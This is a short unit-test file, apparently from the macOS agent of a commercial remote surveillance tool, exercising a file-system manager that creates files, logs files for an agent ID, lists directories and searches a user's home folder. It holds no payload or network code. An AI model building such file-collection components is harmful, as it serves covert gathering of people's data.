/*
 *  RCSMFileSystemManagerTest.m
 *  RCSMac
 *
 *
 *  Created by revenge on 1/27/11.
 *  Copyright (C) HT srl 2011. All rights reserved
 *
 */

#import <Cocoa/Cocoa.h>
#import <GHUnit/GHUnit.h>

#import "RCSMFileSystemManager.h"


@interface RCSMFileSystemManagerTest : GHTestCase

@end

@implementation RCSMFileSystemManagerTest

- (BOOL)shouldRunOnMainThread
{
  // By default NO, but if you have a UI test or test dependent on running on the main thread return YES
  return NO;
}

- (void)setUpClass
{
  // Run at start of all tests in the class
}

- (void)tearDownClass
{
  // Run at end of all tests in the class
}

- (void)setUp
{
  // Run before each test method
}

- (void)tearDown
{
  // Run after each test method
}

//- (BOOL)createFile: (NSString *) withData: (NSData *)aFileData;
//- (BOOL)createLogForFile: (NSString *)aFilePath;
//- (BOOL)logDirContent: (NSString *)aDirectory withDepth: (uint32_t)aDepth;

- (void)testCreateFile
{
  RCSMFileSystemManager *fsManager = [[RCSMFileSystemManager alloc] init];
  NSString *fileContent = [[NSString alloc] initWithString: @"This is a test file"];
  BOOL success = NO;
  
  success = [fsManager createFile: @"antani"
                         withData: [fileContent dataUsingEncoding: NSUTF8StringEncoding]];
  GHAssertTrue(success, @"createFile returned false");
  
  [fileContent release];
  [fsManager release];
}

- (void)testCreateLogForFile
{
  RCSMFileSystemManager *fsManager = [[RCSMFileSystemManager alloc] init];
  BOOL success = NO;
  
  success = [fsManager logFileAtPath: @"/Users/revenge/Desktop/antani.txt"
                          forAgentID: 1];
  GHAssertTrue(success, @"createLogForFile returned false");
  [fsManager release];
}

- (void)testLogDirContent
{
  RCSMFileSystemManager *fsManager = [[RCSMFileSystemManager alloc] init];
  BOOL success = NO;
  
  success = [fsManager logDirContent: @"//Applications/*" withDepth: 1];
  GHAssertTrue(success, @"logDirContent returned false");
  [fsManager release];
}

- (void)testSearchFilesOnHD
{
  RCSMFileSystemManager *fsManager = [[RCSMFileSystemManager alloc] init];
  NSArray *filesFound = nil;
  
  filesFound = [fsManager searchFilesOnHD: @"/Users/revenge/*.*"];
  GHAssertNotNil(filesFound, @"searchFilesOnHD returned nil");
  
  for (NSString *file in filesFound)
    {
      GHTestLog(@"filename: %@", file);
    }
  
  [fsManager release];
}

@end